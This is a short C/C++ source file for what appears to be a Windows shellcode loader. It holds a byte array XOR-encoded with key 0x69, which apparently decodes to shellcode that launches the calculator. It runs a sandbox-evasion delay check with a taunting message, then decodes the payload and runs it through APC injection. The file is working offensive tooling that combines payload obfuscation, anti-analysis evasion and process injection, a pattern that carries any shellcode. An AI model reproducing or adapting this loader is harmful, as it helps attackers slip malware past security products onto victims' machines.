#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "Structs.h"
#include "Loader.h"
#include "Resolver.h"
#include "Utils.h"
#include "Watchdog.h"
#include "Crypto.h"

int main() {
	unsigned char buf[] = {
		0x95,0x21,0xea,0x8d,0x99,0x81,0xa9,0x69,0x69,0x69,0x28,0x38,0x28,0x39,
		0x3b,0x38,0x3f,0x21,0x58,0xbb,0x0c,0x21,0xe2,0x3b,0x09,0x21,0xe2,0x3b,
		0x71,0x21,0xe2,0x3b,0x49,0x21,0xe2,0x1b,0x39,0x21,0x66,0xde,0x23,0x23,
		0x24,0x58,0xa0,0x21,0x58,0xa9,0xc5,0x55,0x08,0x15,0x6b,0x45,0x49,0x28,
		0xa8,0xa0,0x64,0x28,0x68,0xa8,0x8b,0x84,0x3b,0x28,0x38,0x21,0xe2,0x3b,
		0x49,0xe2,0x2b,0x55,0x21,0x68,0xb9,0xe2,0xe9,0xe1,0x69,0x69,0x69,0x21,
		0xec,0xa9,0x1d,0x0e,0x21,0x68,0xb9,0x39,0xe2,0x21,0x71,0x2d,0xe2,0x29,
		0x49,0x20,0x68,0xb9,0x8a,0x3f,0x21,0x96,0xa0,0x28,0xe2,0x5d,0xe1,0x21,
		0x68,0xbf,0x24,0x58,0xa0,0x21,0x58,0xa9,0xc5,0x28,0xa8,0xa0,0x64,0x28,
		0x68,0xa8,0x51,0x89,0x1c,0x98,0x25,0x6a,0x25,0x4d,0x61,0x2c,0x50,0xb8,
		0x1c,0xb1,0x31,0x2d,0xe2,0x29,0x4d,0x20,0x68,0xb9,0x0f,0x28,0xe2,0x65,
		0x21,0x2d,0xe2,0x29,0x75,0x20,0x68,0xb9,0x28,0xe2,0x6d,0xe1,0x21,0x68,
		0xb9,0x28,0x31,0x28,0x31,0x37,0x30,0x33,0x28,0x31,0x28,0x30,0x28,0x33,
		0x21,0xea,0x85,0x49,0x28,0x3b,0x96,0x89,0x31,0x28,0x30,0x33,0x21,0xe2,
		0x7b,0x80,0x3e,0x96,0x96,0x96,0x34,0x21,0xd3,0x68,0x69,0x69,0x69,0x69,
		0x69,0x69,0x69,0x21,0xe4,0xe4,0x68,0x68,0x69,0x69,0x28,0xd3,0x58,0xe2,
		0x06,0xee,0x96,0xbc,0xd2,0x89,0x74,0x43,0x63,0x28,0xd3,0xcf,0xfc,0xd4,
		0xf4,0x96,0xbc,0x21,0xea,0xad,0x41,0x55,0x6f,0x15,0x63,0xe9,0x92,0x89,
		0x1c,0x6c,0xd2,0x2e,0x7a,0x1b,0x06,0x03,0x69,0x30,0x28,0xe0,0xb3,0x96,
		0xbc,0x0a,0x08,0x05,0x0a,0x69 };

	Loader		ldr			= Loader();
	Crypto		crypto		= Crypto();
	Watchdog	watchdog	= Watchdog();

	// Make sure we not in a sandbox:

	if (!watchdog.DelayExecution_WFSO(1)) {
		printf("[!] Nahhh boi you won't catch me slacking with such a noobie check :)");
		return -1;
	}
	crypto.XorByOneKey(buf, sizeof(buf), 0x69);

	printf("[!] SIZE OF PAYLOAD : %zu\n", sizeof(buf));
	ldr.RunApcInjection(buf, sizeof(buf));
	return 0;
}